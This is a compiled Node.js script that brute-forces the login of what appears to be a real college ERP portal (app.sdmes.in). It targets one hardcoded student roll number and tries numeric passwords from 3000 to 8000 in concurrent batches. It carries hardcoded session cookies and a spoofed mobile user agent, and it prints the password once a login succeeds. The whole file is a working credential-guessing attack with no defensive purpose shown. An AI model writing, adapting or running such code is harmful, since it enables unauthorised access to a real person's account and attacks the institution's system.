"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
const qs_1 = __importDefault(require("qs"));
const cheerio_1 = __importDefault(require("cheerio"));
require("dotenv/config");
console.log();
const REQ_OBJECT = {
    ROLLNUMBER: '220964',
    STARTINDEX: 3000,
    ENDINDEX: 8000,
    BATCH: Number(process.env.BATCH) || 50,
    MAX_CONCURRENT_REQUESTS: 50
};
function findPassword(uname, txtps) {
    return __awaiter(this, void 0, void 0, function* () {
        const data = qs_1.default.stringify({
            'ConsID': 'SDMCOLL',
            'userName': uname,
            'txtPwd': txtps,
            'LogTyp': '1',
            'flgS': '1'
        });
        const config = {
            method: 'post',
            maxBodyLength: Infinity,
            url: 'https://app.sdmes.in/EERPV3.0/EAM/logValidate.jsp',
            headers: {
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.8',
                'Connection': 'keep-alive',
                'Content-type': 'application/x-www-form-urlencoded',
                'Cookie': 'JSESSIONID=8DB871AE8B7FE2323E58463FD2F0E5AD; JSESSIONID=FBDA6862B299A34AF9CB15AB84795423',
                'Origin': 'https://app.sdmes.in',
                'Referer': 'https://app.sdmes.in/EERPV3.0/EAM/login.jsp?ConsID=SDMCOLL',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-GPC': '1',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
            },
            data: data
        };
        try {
            const response = yield axios_1.default.request(config);
            return parseHtml(response.data);
        }
        catch (error) {
            return null;
        }
    });
}
function parseHtml(htmlContent) {
    const $ = cheerio_1.default.load(htmlContent);
    const parsedText = $('html').text();
    return parsedText.includes("ERROR") ? null : parsedText;
}
function processBatch(roll, start, end) {
    return __awaiter(this, void 0, void 0, function* () {
        const promises = [];
        for (let i = start; i <= end; i++) {
            const datapromise = findPassword(roll.toString(), i.toString()).then(result => ({ result, password: i }));
            promises.push(datapromise);
            if (promises.length >= REQ_OBJECT.MAX_CONCURRENT_REQUESTS) {
                console.log("-----------50 REQ------------");
                const responses = yield Promise.all(promises);
                const found = responses.find(data => data.result !== null);
                if (found) {
                    return found;
                }
                promises.length = 0;
            }
        }
        if (promises.length > 0) {
            const responses = yield Promise.all(promises);
            return responses.find(data => data.result !== null);
        }
        return null;
    });
}
function main(RollNum, start, end, batch) {
    return __awaiter(this, void 0, void 0, function* () {
        for (let j = start; j <= end; j += batch) {
            console.log("Checking for:", j, "to", j + batch);
            const found = yield processBatch(RollNum, j, j + batch);
            if (found) {
                console.log("ROLL NUMBER:", RollNum, "\nPASSWORD:", found.password);
                process.exit(1);
            }
            else {
                console.log("No password match between", j, "to", j + batch);
            }
        }
    });
}
main(REQ_OBJECT.ROLLNUMBER, REQ_OBJECT.STARTINDEX, REQ_OBJECT.ENDINDEX, REQ_OBJECT.BATCH);
